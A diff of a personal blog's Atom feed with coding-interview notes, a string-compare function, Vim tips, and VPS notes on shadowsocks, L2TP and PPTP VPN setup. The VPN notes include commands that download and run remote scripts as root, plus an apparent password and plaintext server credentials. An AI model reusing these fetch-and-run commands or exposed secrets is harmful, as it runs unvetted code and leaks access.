+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>def get_char(s, p):
+</span><span class='line'>    cnt = 0
+</span><span class='line'>    while p &gt;= 0 and (cnt &gt; 0 or s[p] == '\b'):
+</span><span class='line'>        if s[p] == '\b':
+</span><span class='line'>            cnt += 1
+</span><span class='line'>        else:
+</span><span class='line'>            cnt -= 1
+</span><span class='line'>        p -= 1
+</span><span class='line'>    return p
+</span><span class='line'>
+</span><span class='line'>def compare_(s1, s2):
+</span><span class='line'>        p1 = len(s1) - 1
+</span><span class='line'>        p2 = len(s2) - 1
+</span><span class='line'>        
+</span><span class='line'>        while p1 &gt;= 0 and p2 &gt;= 0:
+</span><span class='line'>            p1 = get_char(s1, p1)
+</span><span class='line'>            p2 = get_char(s2, p2)
+</span><span class='line'>
+</span><span class='line'>            if p1 &gt;= 0 and p2 &gt;= 0:
+</span><span class='line'>                if s1[p1] != s2[p2]:
+</span><span class='line'>                    return False
+</span><span class='line'>                else:
+</span><span class='line'>                    p1 -= 1
+</span><span class='line'>                    p2 -= 1
+</span><span class='line'>
+</span><span class='line'>        p1 = get_char(s1, p1)
+</span><span class='line'>        p2 = get_char(s2, p2)
+</span><span class='line'>        return p1 &lt; 0 and p2 &lt; 0</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>能抽象就抽象。多写几个函数。</li>
+</ul>
+
+
+<h3>Test Case</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>assert(compare_('', '2\b') == True)
+</span><span class='line'>assert(compare_('', '12\b') == False)
+</span><span class='line'>assert(compare_('1', '12\b') == True)
+</span><span class='line'>assert(compare_('', '\b2\b') == True)
+</span><span class='line'>assert(compare_('', '12\b2\b') == False)
+</span><span class='line'>assert(compare_('1', '123\b2\b\b') == True)</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[WAP]]></title>
+    <link href="http://songzy12.github.io/blog/2018/02/22/wap/"/>
+    <updated>2018-02-22T16:25:31+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/02/22/wap</id>
+    <content type="html"><![CDATA[<h2>Round 0</h2>
+
+<p><a href="https://leetcode.com/problems/zigzag-conversion/description/">ZigZag Conversion</a></p>
+
+<h2>Round 1</h2>
+
+<p><a href="https://leetcode.com/problems/word-pattern/description/">Word Pattern</a></p>
+
+<h2>Round 2</h2>
+
+<p><a href="https://tonycao.gitbooks.io/leetcode-locked/content/LeetCode%20Locked/c1.5.html">Strobogrammatic Number I, II, III</a></p>
+
+<h2>Round 3</h2>
+
+<ul>
+<li>勾股定理</li>
+<li><code>grep</code>, <code>find</code></li>
+</ul>
+
+
+<h2>Round 4</h2>
+
+<ul>
+<li>Small Chat</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Tencent IEG]]></title>
+    <link href="http://songzy12.github.io/blog/2018/01/31/tencent-ieg/"/>
+    <updated>2018-01-31T20:13:35+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/01/31/tencent-ieg</id>
+    <content type="html"><![CDATA[<p>这个也是 LeetCode 原题：<a href="https://leetcode.com/problems/integer-break/description/">Integer Break</a></p>
+
+<p>在这里分享一道腾讯互娱的面试题目：</p>
+
+<p>给定 $m\in N$,
+$\max x_1\cdot x_2\dots x_{n-1}\cdot x_n$</p>
+
+<p>s.t. $x_1+x_2+&hellip;+x_n = m$ and $x_i \in N $.</p>
+
+<p>（面试官给的题目里 $m = 25$）</p>
+
+<p>下面我们介绍两种解法，一种是使用动态规划的编程解，另一种是直接手算出答案的数学解。</p>
+
+<h3>动态规划</h3>
+
+<p>我们使用 <code>dp(m)</code> 表示将整数 <code>m</code> 进行如上拆分后所能得到的最大乘积。那么我们要的结果就是 <code>dp(25)</code>.</p>
+
+<p>如何计算 <code>dp(m)</code> 呢？对于一般的情况，我们直接根据所拆分出来的第一个整数进行动态规划：</p>
+
+<p><code>dp(m)= max{i * dp(m-i)}</code> 其中，<code>i \in {1,...,m}</code></p>
+
+<p>这里为了便于计算我们将边界条件设为 <code>dp(0) = 1</code></p>
+
+<p>上面这个算法的复杂度是 <code>O(m^2)</code> ：首先我们需要计算 <code>dp(1),...,dp(m)</code> 这 <code>m</code> 个值，然后在计算每个值<code>dp(m_0)</code>的时候我们需要进行一个 <code>O(m_0)</code> 层的循环。</p>
+
+<h3>数学解法</h3>
+
+<p>首先我们假设分成的份数 <code>n</code> 是固定的，那么根据 <a href="https://zh.wikipedia.org/wiki/%E7%AE%97%E6%9C%AF-%E5%87%A0%E4%BD%95%E5%B9%B3%E5%9D%87%E5%80%BC%E4%B8%8D%E7%AD%89%E5%BC%8F">均值不等式</a>我们有</p>
+
+<p>$\prod_{i=1}^n x_i \le (\frac{\sum_{i=1}^n x_i}{n}) ^ n = (\frac{m}{n}) ^ n$</p>
+
+<p>（几何平均值小于等于算术平均值）</p>
+
+<p>上式取等的条件为各 $x_i$ 均相等。</p>
+
+<p>也就是说，对于给定的 <code>n</code> ，我们要使得各份尽量均匀的情况下乘积最大。</p>
+
+<p>下面我们考虑最优的 <code>n</code> 的取值。我们令 $g(n) = (\frac{m}{n})^n$, 于是只需要求 $g(n)$ 的最大值。</p>
+
+<p>求导，$g'(n)=((\frac{m}{n})^n)&lsquo;=(e^{n\ln(m/n)})&rsquo;=e^{n\ln(m/n)}\cdot (n\ln(\frac{m}{n}))&lsquo;$</p>
+
+<p>因为 $(n\ln(\frac{m}{n}))&lsquo;=ln(\frac{m}{n}) + n\cdot(ln(\frac{m}{n})&rsquo;)=ln(\frac{m}{n}) + n \cdot \frac{n}{m} \cdot (-\frac{m}{n^2}) = ln(\frac{m}{n}) - 1$</p>
+
+<p>从而 $g'(n) > 0\Leftrightarrow  ln(\frac{m}{n})-1 > 0 \Leftrightarrow ln(\frac{m}{n}) > 1\Leftrightarrow \frac{m}{n} > e \Leftrightarrow n &lt; \frac{m}{e}$</p>
+
+<p>也就是说，$g(n)$ 在 $(1, \frac{m}{e})$ 递增，在 $(\frac{m}{e}, +\infty)$ 递减。</p>
+
+<p>所以 $g(n)$ 在 $n=\frac{m}{e}$ 时取最大值，也就是说对于给定的数 $m$, 我们希望分成 $\frac{m}{e}$ 份，也就是说我们希望每份分成的数值是 $e$. 这里的 $e=2.71828$.</p>
+
+<p>由于要求分成整数，所以我们应该分成尽量多的 3 和最多两个 2（因为我们可以把3个2变成2个3）</p>
+
+<p>具体来讲，如果 m % 3 == 0，那就是 m / 3 个 3; m % 3 == 2 就是  m / 3 个 3 和 1 个 2；m % 3 == 1, 我们把多出来的 1 和它前面的那个 3 放一起拆成两个 2（2 * 2 > 1 * 3）, 就是 (m / 3 - 1) 个 3 和 2 个 2.</p>
+
+<p>具体到 25，就是 25 = 3 * 7 + 2 * 2，最大的积为 $3^7\times 2^2$.</p>
+
+<p>$\cdot$</p>
+
+<h3>其他问题</h3>
+
+<p>面试中遇到的其他问题包括：</p>
+
+<ol>
+<li>说说 word2vec 的不同方法：CBOW v.s. skip-gram</li>
+<li>说说 梯度弥散 v.s. 梯度爆炸</li>
+<li>说说 线性回归 v.s 逻辑回归</li>
+<li>说说 逻辑回归 中为什么使用 Sigmoid 函数</li>
+<li>说说 SGD v.s. BGD</li>
+<li>说说除了 SGD 之外其他的 Optimizer:  Adagrad, Adam</li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Vim]]></title>
+    <link href="http://songzy12.github.io/blog/2018/01/06/vim/"/>
+    <updated>2018-01-06T20:50:00+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/01/06/vim</id>
+    <content type="html"><![CDATA[<h2>syntax</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cd /usr/share/vim/vim74/syntax 
+</span><span class='line'>vi python.vim</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>syn keyword pythonTodo      FIXME NOTE NOTES TODO XXX contained</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls ~/.vim/
+</span><span class='line'>ftdetect  ftplugin  indent  syntax</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>color</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls /usr/share/vim/vim74/colors/
+</span><span class='line'>vi ~/.vimrc
+</span><span class='line'>color default</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>|</h2>
+
+<p><code>80|</code> should get you to position 80 in that line.</p>
+
+<h2>d</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dG 删除直到工作缓存区结尾的内容
+</span><span class='line'>d1G 删除直到工作缓存区开始的内容</span></code></pre></td></tr></table></div></figure>
+
+
+<p>删除第9行到第200行的内容(先用200G转到第200行) ，使用</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>:9,.d</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>e</h2>
+
+<p>重新加载</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>:e</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>J</h2>
+
+<p>合并行</p>
+
+<p>In command mode:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[range]j[lines]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>here you want to do the whole buffer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%j</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you just wanted to do 10 lines from the current cursor position:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>j10</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you dont want to replace the new lines with spaces use ! after j.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%j!
+</span><span class='line'>j!10</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And for the uberfancy:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>5j20</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Would go to line 5, and join the next 20 lines.</p>
+
+<h2>ret</h2>
+
+<p><code>set tabstop=4</code>: set the tabs to display as four spaces.
+<code>set expandtab</code>: insert spaces for tabs.
+<code>ret</code>: replace tab</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>set expandtab
+</span><span class='line'>:%ret! 4</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>s</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>:%s/源字符串/目的字符串/g</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Add a string(<code>*</code>) to the end of each line in Vim:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>:%s/$/\*/g</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>set</h2>
+
+<ul>
+<li>nu</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>set nu
+</span><span class='line'>set nonu</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>paste</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>set paste</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>invlist</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>set invlist
+</span><span class='line'>set nolist</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>shell</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ctrl+z 
+</span><span class='line'>fg</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>:!vim --version</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>:shell</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>undo, redo</h2>
+
+<ul>
+<li><code>u</code></li>
+<li><code>ctrl+r</code></li>
+</ul>
+
+
+<h2>vsp</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vim -On file1 file2 # 分屏启动Vim
+</span><span class='line'>:vsp filename # 分屏
+</span><span class='line'>Ctrl+w r # 滚动分屏
+</span><span class='line'>Ctrl+w = # 分屏宽度</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Vultr]]></title>
+    <link href="http://songzy12.github.io/blog/2017/11/30/vultr/"/>
+    <updated>2017-11-30T19:45:03+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/11/30/vultr</id>
+    <content type="html"><![CDATA[<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>1E#m2WXS9LdvTCNA
+</span><span class='line'>tail -f /var/log/syslog</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Chrome 标签不同步也可能是因为 GFW 无法连接 Google 服务所致。</p>
+
+<h2>socls</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import urllib2
+</span><span class='line'>import socks
+</span><span class='line'>from sockshandler import SocksiPyHandler
+</span><span class='line'>
+</span><span class='line'>opener = urllib2.build_opener(SocksiPyHandler(socks.SOCKS5, "127.0.0.1", 1080))
+</span><span class='line'>x = opener.open("http://www.youtube.com/")
+</span><span class='line'>print x.read()</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>ss client</h2>
+
+<p><a href="http://www.sundabao.com/ubuntu%E4%BD%BF%E7%94%A8shadowsocks/">http://www.sundabao.com/ubuntu%E4%BD%BF%E7%94%A8shadowsocks/</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt-get update
+</span><span class='line'>sudo apt-get install python-pip
+</span><span class='line'>sudo apt-get install python-setuptools m2crypto
+</span><span class='line'>pip install shadowsocks
+</span><span class='line'>sudo apt install shadowsocks</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sslocal -s 11.22.33.44 -p 50003 -k "123456" -l 1080 -t 600 -m aes-256-cfb</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vi config.json</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>{
+</span><span class='line'>    "server":"11.22.33.44",
+</span><span class='line'>    "server_port":50003,
+</span><span class='line'>    "local_port":1080,
+</span><span class='line'>    "password":"123456",
+</span><span class='line'>    "timeout":600,
+</span><span class='line'>    "method":"aes-256-cfb"
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sslocal -c shadowsocks.json</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SwitchyOmega: <a href="https://github.com/FelisCatus/SwitchyOmega/releases/">https://github.com/FelisCatus/SwitchyOmega/releases/</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nohup sslocal -c shadowsocks.json &</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>ss server</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh
+</span><span class='line'>chmod +x shadowsocks.sh
+</span><span class='line'>./shadowsocks.sh 2&gt;&1 | tee shadowsocks.log</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vi /etc/shadowsocks.json</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>{
+</span><span class='line'>    "server":"45.32.251.88",
+</span><span class='line'>    "server_port":8388,
+</span><span class='line'>    "local_address": "127.0.0.1",
+</span><span class='line'>    "local_port":1080,
+</span><span class='line'>    "password":"shadowsocks",
+</span><span class='line'>    "timeout":300,
+</span><span class='line'>    "method":"aes-256-cfb",
+</span><span class='line'>    "fast_open": false
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>https://github.com/shadowsocks/shadowsocks-windows/releases</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssserver -c /etc/shadowsocks.json -d start
+</span><span class='line'>ssserver -c /etc/shadowsocks.json -d stop</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo less /var/log/shadowsocks.log</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>L2TP</h2>
+
+<p><a href="https://github.com/hwdsl2/setup-ipsec-vpn">here</a>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget https://git.io/vpnsetup -O vpnsetup.sh && sudo sh vpnsetup.sh</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>NET_IFO=${VPN_IFACE:-'ens3'}
+</span><span class='line'>NET_IFS=$(VPN_IFACE:-'ens3')</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Server IP: 45.32.251.88
+</span><span class='line'>IPsec PSK: shadowsocks
+</span><span class='line'>Username: vpnuser
+</span><span class='line'>Password: shadowsocks</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>无法建立计算机与 VPN 服务器之间的网络连接，因为远程服务器未响应。</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/docs/clients-zh.md">here</a>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>REG ADD HKLM\SYSTEM\CurrentControlSet\Services\PolicyAgent /v AssumeUDPEncapsulationContextOnSendRule /t REG_DWORD /d 0x2 /f</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>PPTP</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>server name or address: 45.32.251.88
+</span><span class='line'>user name: vpnuser
+</span><span class='line'>password: shadowsocks</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="https://www.vultr.com/docs/setup-a-pptp-vpn-server-on-ubuntu">PPTP VPN</a></p>
+
+<h3>Installing PPTPD</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install pptpd</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Adding users</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vi /etc/ppp/chap-secrets 
+</span><span class='line'># vpn pptpd   shadowsocks *</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Edit the PPTPD settings</h3>
+
+<p>Change <code>localip</code> to your server IP.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig -a
+</span><span class='line'>vi /etc/pptpd.conf 
+</span><span class='line'>
+</span><span class='line'># localip 45.32.251.88
+</span><span class='line'># remoteip 192.168.0.234-238, 192.168.0.245</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Update sysctl.conf</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vi /etc/sysctl.conf 
+</span><span class='line'># net.ipv4.ip_forward = 1
+</span><span class='line'>sysctl -p</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vi /etc/ppp/pptpd-options 
+</span><span class='line'># ms-dns 8.8.8.8  
+</span><span class='line'># ms-dns 8.8.4.4</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Restarting PPTPD</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>service pptpd restart
+</span><span class='line'>netstat -alpn | grep :1723
+</span><span class='line'>
+</span><span class='line'>systemctl start pptpd.service
+</span><span class='line'>systemctl enable pptpd.service</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>iptables</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig -a
+</span><span class='line'>vi /etc/rc.local</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Accept all packets via ppp* interfaces (for example, ppp0)
+</span><span class='line'>iptables -A INPUT -i ppp+ -j ACCEPT
+</span><span class='line'>iptables -A OUTPUT -o ppp+ -j ACCEPT
+</span><span class='line'>
+</span><span class='line'># Accept incoming connections to port 1723 (PPTP)
+</span><span class='line'>iptables -A INPUT -p tcp --dport 1723 -j ACCEPT
+</span><span class='line'>
+</span><span class='line'># Accept GRE packets
+</span><span class='line'>iptables -A INPUT -p 47 -j ACCEPT
+</span><span class='line'>iptables -A OUTPUT -p 47 -j ACCEPT
+</span><span class='line'>
+</span><span class='line'># Enable IP forwarding
+</span><span class='line'>iptables -F FORWARD
+</span><span class='line'>iptables -A FORWARD -j ACCEPT
+</span><span class='line'>
+</span><span class='line'># Enable NAT for eth0 on ppp* interfaces
+</span><span class='line'>iptables -A POSTROUTING -t nat -o eth0 -j MASQUERADE
+</span><span class='line'>iptables -A POSTROUTING -t nat -o ppp+ -j MASQUERADE</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tail -f /var/log/syslog</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>hosts</h3>
+
